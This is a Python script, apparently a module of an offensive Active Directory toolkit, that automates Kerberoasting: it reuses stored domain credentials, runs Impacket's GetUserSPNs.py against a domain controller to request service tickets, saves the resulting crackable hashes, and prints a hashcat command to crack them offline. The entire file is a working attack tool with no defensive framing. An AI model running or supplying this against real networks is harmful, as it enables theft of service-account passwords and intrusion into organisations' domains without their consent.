#!/usr/bin/env python3
import sys
import os
import argparse
import subprocess

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))

from core.database import DatabaseManager, Credential
from core.logger import setup_logger, get_logger

logger = None

def run_kerberoast(session_dir, domain, dc_ip, username=None, password=None):
    global logger
    setup_logger("kerberoast", session_dir)
    logger = get_logger("kerberoast")
    
    db_path = os.path.join(session_dir, "session.db")
    db = DatabaseManager(db_path)
    
    logger.info(f"Starting Kerberoasting against {domain}")
    
    # If no creds provided, try to get from DB
    if not username or not password:
        session = db.get_session()
        creds = session.query(Credential).filter_by(domain=domain, is_valid=True).first()
        session.close()
        
        if creds:
            username = creds.username
            password = creds.password if creds.password else None
            
            if not password:
                logger.warning("No valid credentials available. Kerberoasting requires auth.")
                return
        else:
            logger.warning("No credentials found in database.")
            return
    
    logger.info(f"Using credentials: {domain}\\{username}")
    
    # Output file for hashes
    hash_file = os.path.join(session_dir, "kerberoast_hashes.txt")
    
    # GetUserSPNs.py command (from Impacket)
    cmd = [
        "GetUserSPNs.py",
        f"{domain}/{username}:{password}",
        "-dc-ip", dc_ip,
        "-request",
        "-outputfile", hash_file
    ]
    
    try:
        logger.info("Running GetUserSPNs.py...")
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=60
        )
        
        logger.debug(result.stdout)
        
        if result.returncode == 0:
            logger.info(f"Kerberoast hashes saved to {hash_file}")
            
            # Count hashes
            if os.path.exists(hash_file):
                with open(hash_file, 'r') as f:
                    hash_count = sum(1 for line in f if line.startswith('$krb5tgs$'))
                logger.info(f"Captured {hash_count} TGS tickets")
            
            # TODO: Integrate hashcat for cracking
            logger.info("Run hashcat to crack: hashcat -m 13100 kerberoast_hashes.txt wordlist.txt")
        else:
            logger.error(f"GetUserSPNs.py failed: {result.stderr}")
            
    except FileNotFoundError:
        logger.error("GetUserSPNs.py not found. Install Impacket: pip3 install impacket")
    except Exception as e:
        logger.error(f"Error during Kerberoasting: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--session-dir", required=True)
    parser.add_argument("--domain", required=True)
    parser.add_argument("--dc-ip", required=True)
    parser.add_argument("--username", help="Domain username")
    parser.add_argument("--password", help="Password")
    args = parser.parse_args()
    
    run_kerberoast(args.session_dir, args.domain, args.dc_ip, args.username, args.password)
